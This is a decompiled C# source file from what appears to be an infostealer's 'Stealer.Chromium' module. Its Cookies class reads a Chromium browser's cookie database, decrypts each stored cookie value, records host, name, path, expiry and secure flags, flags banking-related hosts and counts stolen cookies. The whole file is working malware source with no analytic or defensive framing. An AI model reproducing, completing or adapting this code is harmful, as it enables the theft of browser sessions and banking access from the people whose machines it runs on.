using System;
using System.Collections.Generic;

namespace Stealer.Chromium
{
	// Token: 0x02000039 RID: 57
	internal sealed class Cookies
	{
		// Token: 0x060000F0 RID: 240 RVA: 0x00008490 File Offset: 0x00006690
		public static List<Cookie> Get(string sCookie)
		{
			List<Cookie> result;
			try
			{
				List<Cookie> list = new List<Cookie>();
				SQLite sqlite = SqlReader.ReadTable(sCookie, "cookies");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Cookie item = default(Cookie);
						item.sValue = Crypto.EasyDecrypt(sCookie, sqlite.GetValue(i, 12));
						if (item.sValue == "")
						{
							item.sValue = sqlite.GetValue(i, 3);
						}
						item.sHostKey = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						item.sName = Crypto.GetUTF8(sqlite.GetValue(i, 2));
						item.sPath = Crypto.GetUTF8(sqlite.GetValue(i, 4));
						item.sExpiresUtc = Crypto.GetUTF8(sqlite.GetValue(i, 5));
						item.sIsSecure = Crypto.GetUTF8(sqlite.GetValue(i, 6).ToUpper());
						Banking.ScanData(item.sHostKey);
						Counter.Cookies++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Cookie>();
			}
			return result;
		}
	}
}
